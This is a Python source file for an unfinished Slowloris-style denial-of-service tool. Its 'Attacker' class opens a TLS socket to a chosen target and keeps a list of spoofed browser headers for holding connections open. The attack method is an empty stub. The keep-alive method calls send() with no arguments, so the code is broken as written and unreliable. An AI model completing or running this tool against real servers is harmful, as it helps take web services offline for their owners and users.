import socket
import ssl


class Attacker:
    def __init__(self, target):
        self.target = target
        self.port = 80
        self.loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.status = "Unconnected"




        self.fakeHeaderList = [
            [
                "User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, Gecko) Chrome/55.0.2919.83 Safari/537.36",
                "Accept-language: ru,q=0.5",
                "Connection: Keep-Alive"
            ]
            , [
                "User-agent: Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
                "Accept-language: ro,q=0.5",
                "Connection:Keep-Alive"
            ],
            [
                "User-agent: Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16)",
                "Accept-language: vi, q=0.5",
                "Connection: Keep-alive"
            ]

        ]
    #This method creates the sockets that will be used in the attack
    def createSocket(self):

        #This needs to be changed to enable HTTPS connections, this implementation is currently
        #loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.loris = ssl.wrap_socket(self.loris, ssl_version=ssl.PROTOCOL_SSLv23)

        self.loris.connect((self.target, 443))

        self.status = "Connected to "+self.target+" Target on port 443"





       # req = "GET / HTTP/1.1\nHost: "+self.target+"\r\n\r\n"

        #loris.send(req.encode())


       # info = loris.recv(10000)


        #print(info.decode("utf8"))




    #Method that starts the attack on the target
    def attackTarget(self):
        try:
            pass
        except Exception as e:
            print(e)

        self.status = "Attacking "+self.target+""

    #Calls on a socket to stay alive
    def stayAlive(self):
        self.loris.send()
        pass
    #Return the current status of the Attacker
    def returnStatus(self):
        return self.status
